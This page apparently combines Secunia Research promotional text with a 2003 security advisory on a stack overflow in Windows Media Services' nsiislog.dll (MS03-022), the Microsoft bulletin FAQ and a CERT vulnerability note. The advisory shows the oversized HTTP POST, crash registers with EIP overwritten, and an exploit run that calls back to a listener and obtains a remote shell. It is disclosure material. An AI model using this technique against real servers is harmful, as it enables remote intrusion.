How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

========================================================================
= Windows Media Services Remote Command Execution #2
=
= brett.moore@security-assessment.com
= <http://www.security-assessment.com>
=
= MS Bulletin posted: June 25, 2003
= <http://www.microsoft.com/technet/security/bulletin/MS03-022.asp>
=
= Affected Software:
= 	Microsoft Windows 2000
=
= Public disclosure on June 25, 2003
=========================================================================
= Our Rating: Due to the ease of exploitation of this vulnerability and
= the fact that it allows command execution against a vulnerable server
= we feel that this patch is CRITICAL for all servers that have the
= vulnerable dll installed even if Windows Media Services are not in use.
=========================================================================

A short time after a long time ago, in a place very similar to the last,
where the sun shines, the snow falls and the water is still clean....

Continuing with our 'Methodical Approach To Finding Overflows' against
nsiislog.dll we discovered another issue but due to complications this
fix was not released with the previous nsiislog.dll bulletin.

== MS03-022 states ==
Impact of vulnerability: Allow an attacker to execute code of their choice
Maximum Severity Rating: Important

There is a flaw in the way nsiislog.dll processes incoming client requests.
A vulnerability exists because an attacker could send specially formed HTTP
request (communications) to the server that could cause IIS to fail or
execute code on the user's system.
== MS03-022 ==

== Description ==

Sending a large standard post to nsiislog.dll will cause an access
violation resulting in the following error log.

------------------------------------------------------------------------
Event Type:	Warning
Event Source:	W3SVC
Event Category:	None
Event ID:	37
Description:
Out of process application '/LM/W3SVC/1/Root' terminated unexpectedly.
------------------------------------------------------------------------

This results in a standard stack based overflow, resulting in EIP
been set to an arbitrary value allowing for remote command execution
with privileges associated with the IWAM_machinename account.

== Standard HTTP Post ==

POST /scripts/nsiislog.dll HTTP/1.1
content-length: <postlength>

<post data>

Using Size: 4354
Connecting....Sending Buffer....
78028E9F   mov al,byte ptr [esi]     ESI = 00B138B4

Using Size: 5000
Connecting....Sending Buffer....
40F01F3B   repne scas byte ptr [edi] EDI = 58585858

Using Size: 25000
Connecting....Sending Buffer....
78005994   mov dword ptr [edi],edx   EDX = 58585858
-
58585858   ???  illegal op           EIP = 58585858

== Exploitation ==

Commonly referred to as a stack based overflow, control is taken when the
EIP is set to a value from the stack. Widely known and easily exploitable
by using a call or jmp instruction or in the worst case a brute force
technique of direct jumps.

In this case control is taken when a value is obtained from the stack
and then used in a direct call.

77FB98E1   mov         ecx,dword ptr [ebp+18h]
77FB98E4   call        ecx

== Exploit Example ==

%:\>exploit 192.168.1.63
** IISNSLOG.DLL - Remote Shell **

. Calling Home: blackhole:2000
. Shellcode Size: 322 bytes
. Preparing Exploit Buffer......Ready
. Starting Listener On Port: 2000
. Connecting To Target
. Sending Exploit......Exploit Sent
. Connection Received

C:\WINNT\system32>whoami
IWAM_BLACKHOLE
C:\WINNT\system32>

== Solutions ==

- Every day is a 0-day day on the Internet. Limiting the avenues of attack
  can be a key factor in reducing the risk to a web server. Programs such
  as secureIIS and URLscan should be setup to reduce the number of methods
  that can be used to send data to a server. Removing unnecessary services,
  files and isapi extensions reduces the number of listeners that data can
  be fed to limiting the number of vulnerabilities that a server is
  susceptible to.
- Install the vendor supplied patch.

### General Information

## Technical details

Subsequent to the release of this update Microsoft was made aware that under certain circumstances the original update provided with this bulletin did not replace the vulnerable file on the hard drive. These situations involved whether or not Windows Media Services was uninstalled previous to the application of the update. Microsoft has addressed this issue and is re-releasing the update on Windows Update and the Microsoft Download Center.

**Technical description:**

Microsoft Windows Media Services is a feature of Microsoft Windows 2000 Server, Advanced Server, and Datacenter Server and is also available in a downloadable version for Windows NT 4.0 Server. Windows Media Services contains support for a method of delivering media content to clients across a network known as multicast streaming. In multicast streaming, the server has no connection to or knowledge of the clients that may be receiving the stream of media content coming from the server. To facilitate logging of client information for the server, Windows 2000 includes a capability specifically designed to enable logging for multicast transmissions.

This logging capability is implemented as an Internet Services Application Programming Interface (ISAPI) extension - nsiislog.dll. When Windows Media Services are added through add/remove programs to Windows 2000, nsiislog.dll is installed in the Internet Information Services (IIS) Scripts directory on the server. Once Windows Media Services is installed, nsiislog.dll is automatically loaded and used by IIS.

There is a flaw in the way nsiislog.dll processes incoming client requests. A vulnerability exists because an attacker could send specially formed HTTP request (communications) to the server that could cause IIS to fail or execute code on the user's system.

Windows Media Services is not installed by default on Windows 2000. An attacker attempting to exploit this vulnerability would have to be aware which computers on the network had Windows Media Services installed on it and send a specific request to that server.

**Mitigating factors:**

* Windows Media Services 4.1 is not installed by default on Windows 2000.
* Windows Media Services are not available for Windows 2000 Professional.

**Severity Rating:**

**Tested Versions:**

Microsoft tested Windows NT 4.0, Windows 2000, Windows XP and Windows Server 2003 to assess whether they are affected by these vulnerabilities. Previous versions are no longer [supported](https://go.microsoft.com/fwlink/?linkid=21742), and may or may not be affected by these vulnerabilities.

## Frequently asked questions

**Why are you re-releasing this update?**

Subsequent to the release of this update Microsoft was made aware that under certain circumstances the original update provided with this bulletin did not replace the vulnerable file on the hard drive. These situations involved whether or not Windows Media Services was uninstalled previous to the application of the update. Microsoft has addressed this issue and is re-releasing the update on Windows Update and the Microsoft Download Center.

**Should I re-apply the update?**

If the vulnerable version of NSIISLOG.DLL is still on the system, you will be offered the update again if you go to Windows Update. You can search your system for the NSIISLOG.DLL file to determine if the update should be applied. To do this, perform the following steps: If you have installed Windows Media Services on Windows 2000 Server, then the nsiislog.dll file is automatically copied to the proper IIS directory and loaded. To determine if nsiislog.dll is installed on the computer, perform the following steps:

1. From the Start Menu, click search.
2. Click For Files or Folders
3. In the search dialog, type in the file name, NSIISLOG.DLL
4. Click Search Now.
5. If the file is not present, you do not need to apply this update. If the file is present, right click the file and choose properties.
6. Click the Version tab
7. If the file version is less than 4.1.0.3932, you should apply this re-released update.

**What's the scope of the vulnerability?**

This is a [Buffer Overrun](https://technet.microsoft.com/security/bulletin/glossary) vulnerability. An attacker who successfully exploited this vulnerability could cause a Windows 2000 server that was performing streaming media logging to fail in a way that could allow code to execute in the security context of the IIS service.

**How could an attacker exploit this vulnerability?**

An attacker could exploit this vulnerability by constructing a specific network request and sending it to the server running Windows Media Services. The attacker would have to know which server on the network or Internet had Windows Media Services installed in order to cause the server to stop responding to IIS requests or cause code to execute in the server.

**What could this vulnerability enable an attacker to do?**

This vulnerability could enable an attacker to execute code of his or her choice on a computer running IIS with Windows Media Services installed. The code would execute in the context of the account under which IIS was running, which could allow the attacker to take any action on the system.

**What causes the vulnerability?**

The vulnerability results because of an unchecked buffer used by nsiislog.dll, the streaming media component that is used to log multicast requests. If a specially crafted request was sent to the server, the logging program would attempt to write a larger buffer than was available, which then in turn could cause the IIS service to fail and could allow code of the attacker's choice to execute.

**What is nsiislog.dll?**

Nsiislog.dll is an IIS ISAPI extension that is included with Windows 2000 Server. It provides logging capabilities for Media Streaming in Microsoft Windows Media Services. It is installed and used automatically whenever Windows Media Services are installed on a computer.

**What versions of IIS might be affected by the vulnerable version of nsiislog.dll?**

The vulnerable version of nsiislog.dll can be installed on IIS 5.0.

**What products does IIS 5.0 ship with?**

Internet Information Service 5.0 is included with Windows 2000 Datacenter Server, Advanced Server, Server and Professional.

**Does IIS 5.0 run by default?**

IIS 5.0 runs by default on all Windows 2000 server products. It does not run by default on Windows 2000 Professional.

**What are Microsoft Windows Media Services?**

Windows Media Services is a feature of Windows 2000 Server, Advanced Server, and Datacenter Server and provides streaming audio and video services for use over corporate intranets and the Internet.

**Can I install Windows Media Services on Windows 2000 Professional?**

No - Windows Media Services are only available for Microsoft Windows Server operating systems, such as Windows 2000 Server, Advanced Server and Datacenter Server.

**Does this vulnerability affect Windows Media Services on Windows NT 4.0?**

That depends. If you have applied the previous patch for Windows Media Servers from security bulletin MS03-019, this vulnerability does not affect Windows NT 4.0.

**What is Multicast Media Streaming?**

Multicast media streaming is a method of delivering media content to clients across a network. In contrast to unicast media streaming, multicasting sends a single copy of the data that can be received by any clients that request it. Multiple copies of data are not sent across the network, nor is data processed by clients who do not request it. For more information on Multicast Media Streaming, please see the following web site:
</https:>[https:](https://)

**How can I determine whether someone has set up my computer to perform multicast streaming media logging?**

If you have installed Windows Media Services on Windows 2000 Server, then the nsiislog.dll file is automatically copied to the proper IIS directory and loaded. To determine if nsiislog.dll is installed on the computer, perform the following steps:

* From the Start Menu, click search.
* Click For Files or Folders
* In the search dialog, type in the file name, NSIISLOG.DLL
* Click Search Now.

If the file NSIISLOG.DLL is present in any directory shared by IIS, then the server is configured for logging clients of multicast streams.

**What does the Patch do?**

The fix eliminates the vulnerability by ensuring that the Nsiislog.dll file correctly responds to requests.

## Microsoft Windows Media Services contains buffer overflow in "nsiislog.dll"

#### Vulnerability Note VU#113716

Original Release Date: 2003-07-31 | Last Revised: 2003-07-31

### Overview

Microsoft [Windows Media Services](http://www.microsoft.com/windows/windowsmedia/9series/server.aspx) provides streaming audio and video capabilities. A vulnerability in a component of this software could allow a remote attacker to compromise the server running it.

### Description

| According to Microsoft Security Bulletin [MS03-022](http://microsoft.com/technet/security/bulletin/MS03-022.asp):  Microsoft Windows Media Services is a feature of Microsoft Windows 2000 Server, Advanced Server, and Datacenter Server and is also available in a downloadable version for Windows NT 4.0 Server. Windows Media Services contains support for a method of delivering media content to clients across a network known as multicast streaming. In multicast streaming, the server has no connection to or knowledge of the clients that may be receiving the stream of media content coming from the server. To facilitate logging of client information for the server, Windows 2000 includes a capability specifically designed to enable logging for multicast transmissions.  This logging capability is implemented as an Internet Services Application Programming Interface (ISAPI) extension nsiislog.dll. When Windows Media Services are added through add/remove programs to Windows 2000, nsiislog.dll is installed in the Internet Information Services (IIS) Scripts directory on the server. Once Windows Media Services is installed, nsiislog.dll is automatically loaded and used by IIS.A buffer overflow flaw exists in the way that nsiislog.dll processes incoming client requests. This flaw results in a vulnerability because an attacker could send the server a maliciously crafted HTTP request that could execute code on the vulnerable server or could cause IIS to fail.This vulnerability is not believed to immediately affect servers running Windows Media Services as a stand-alone service outside the context of IIS. Since the nsiislog.dll file is not available as an ISAPI extension in this environment, an attacker would not be able to supply data to it in a way that exploits the buffer overflow error. The CERT/CC still encourages sites employing this configuration to apply the remediation steps described below in order to mitigate other potential exploitation vectors. |
| --- |

### Impact

| A remote attacker may be able to execute arbitrary code in the context of the account under which IIS was running. This access could be leveraged by the attacker to take any action on the system. |
| --- |

### Solution

| Microsoft has released patches for this issue. Users are encouraged to review Microsoft Security Bulletin [MS03-022](http://microsoft.com/technet/security/bulletin/MS03-022.asp) for more information. |
| --- |

| **Workarounds**If nsiislog.dll is being used as an ISAPI extension to IIS and its functionality is not required, sites are encouraged to unmap the extension. |
